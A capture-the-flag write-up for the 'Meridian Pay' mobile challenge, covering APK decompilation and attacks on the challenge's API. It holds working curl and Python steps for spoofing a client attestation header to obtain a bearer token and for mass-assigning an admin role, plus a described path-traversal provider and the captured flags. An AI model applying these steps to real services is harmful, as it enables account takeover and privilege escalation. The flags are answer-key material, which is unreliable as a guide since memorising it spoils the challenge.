# Meridian Pay - Mobile (Hard)

**Flag:** three of the four objectives · **Files:** `meridian-pay-3.2.1.apk.zip`, 12771 B, inside it a 16885 B APK sha256 `447c3cd07770cfd78c6601f9076167208e5b670f3708be085cb69d08f741efa1` · **Service:** `https://web-3f25599ac74e8a91.web.h7tex.com`

```
v1  H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2  H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4  H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3  not acquired yet
```

## Challenge

A neobank that "ships fast and trusts everyone": the app trusts the server, the server trusts the app, and both trust
the phone underneath. The challenge says there are four separate cracks, one flag each, scattered between the app and
the API behind it.

You get a 12.5 KB APK and an HTTP instance. Four independent objectives; no flag is needed to get another one.

## Analysis

The APK is unusually small. Opened up it holds only `AndroidManifest.xml`, a 13776 B `classes.dex`, an 1100 B
`resources.arsc`, one layout and `META-INF/`. No lib, no asset. A D8 build with `compilation-mode=debug`,
`min-api=24`.

`strings` on the dex gives exactly what is needed: `/api/v1/auth/device`, `/api/v1/promo/public`,
`/files/`, `device_id`, `seedReceipts`, `val$ftoken`, `Authenticating device...`. The most important thing is what is
absent: no `H7CTF{` string anywhere in the file. The flags live server-side; the APK is just documentation.

Decompiling with androguard to read function bodies reveals the three places the author describes as "trust":

- `ApiClient` hardcodes `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`. The server uses that string as
  proof of a valid device, i.e. the client self-declares that it is attested.
- `Session.setBaseUrl(...)` takes the UI text input directly, and `RouterActivity` accepts a deep link `?url=` and
  overwrites SharedPreferences with that same value.
- `ExportProvider` is an exported provider whose inner path goes through
  `new File(receiptsDir, path.substring(7))` with no `..` filtering, while `seedReceipts` writes data into `files/`.

So the direction is to call the API exactly the way the app does, then pry open the two places where the server trusts
the client too much: the self-declared header, and the body of `PATCH /api/v1/profile`.

## Solution

**Step 1 - Request a bearer with the app's own header.** `POST /api/v1/auth/device` without the header is refused by
the server:

```bash
curl -sk -X POST $U/api/v1/auth/device -H 'Content-Type: application/json' \
     -d '{"device_id":"probe-1"}'
```

```
{"error":"client attestation required"}
```

Adding the header the app sends is enough, and whatever `device_id` holds does not matter:

```bash
curl -sk -X POST $U/api/v1/auth/device \
     -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
     -H 'Content-Type: application/json' -d '{"device_id":"probe-1"}'
```

The 200 response carries the `token` key, an HS256 JWT whose payload is `{"sub":"1001",...}`. The server issues member
1001's bearer to anyone who types the right client discriminator string.

**Step 2 - v1.** The `promo/public` page is public, and it already links to where we need to go:

```html
<p>Enrolled members can finish loyalty sign-up in the app: <a href="/api/v1/internal/promo">complete enrollment</a>.</p>
```

Call `/api/v1/internal/promo` with the attested header + bearer:

```
200  180  <html><body><h3>Meridian Pay - Loyalty Enrollment</h3><p>Welcome back, member 1001. Enrollment confirmation:</p><pre>H7CTF{474de245-b63a-4fc
```

**Step 3 - v2, via mass assignment.** `PATCH /api/v1/profile` stores whatever the body sends directly,
including `role` (only `email`/`name`/`role`/`tier` are writable). Set `role=admin` and read the ledger:

```python
req("/api/v1/profile", "PATCH", {"role": "admin"}, hdr=A)
print(req("/api/v1/admin/ledger", hdr=A))
```

```
200  152  {"corporate_master_key_rotation":"H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}","generated":"2026-09-24","note":"admin-only consolidated ledg
```

The same path before the role change returns `{"error":"admin role required"}`.

**Step 4 - v4.** The same device-session bearer opens `/api/v1/accounts/me`:

```
1) accounts/me: 200 {"account":{"balance_cents":418233,"memo":"personal checking","number":"MP-0041-8827",
"owner":1001,"type":"checking"},"onboarding_memo":"session verified from device -
H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}","user_id":1001}
```

`onboarding_memo` carries the flag because the server treats "the right app header" as proof that the session was
verified on the device. On the client side there really is a way to expose the session: the JWT sits in plaintext in
SharedPreferences, and `ExportProvider` is exported, its path not filtering `..`.

**Step 5 - Re-verifying everything.** Before submitting, run the whole thing once from the start: request a fresh
token, then read the three endpoints. All three flags came out exactly as above. `tier` was set back and forth across
seven values during that sweep, so the profile has been modified; the three endpoints still returned only those three
flags, nothing more.

## Result
```bash
python exploit.py https://web-3f25599ac74e8a91.web.h7tex.com
```

```
v1 /api/v1/internal/promo   H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2 /api/v1/admin/ledger     H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4 /api/v1/accounts/me      H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3 - not acquired yet, 5/... solves
```

The instance expired after that run (the session's 45 minutes ran out). The three flags above are results I re-ran and
re-checked myself on the instance; this record does not claim any submission state on the platform. v3 has two leads
left open, written up in detail at the end of `notes.md`.
